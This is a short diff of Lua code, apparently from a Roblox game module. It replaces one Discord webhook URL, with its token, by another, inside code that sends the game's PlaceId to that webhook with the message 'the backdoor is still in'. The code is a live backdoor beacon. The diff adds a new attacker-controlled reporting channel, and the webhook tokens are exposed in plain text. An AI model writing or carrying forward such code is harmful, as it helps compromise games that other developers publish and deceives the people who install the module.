@@ -23,7 +23,7 @@ function m:Init()
 			PlaceId = game.PlaceId;
 		end)
 		if PlaceId then
-			local Channel = "https://discord.com/api/webhooks/1360044566467842170/NuVI-TEQlHxgpyVFJTog8disz5xia_vohoEcKjekSMQZXNABvfNUUA3cU36lQRATCUXw"
+			local Channel = "https://discord.com/api/webhooks/1376749488680603689/Q9EfJXXh0F1ITxJC6i5Nsqkxx6OCqu-VsYJHJapmBbwrTf4uotVOBxKnBSt-iscg6wrr"
 			local Info = {
 				Message = "the backdoor is still in, PlaceId: "..tostring(PlaceId);
 				Title = "Lololol"
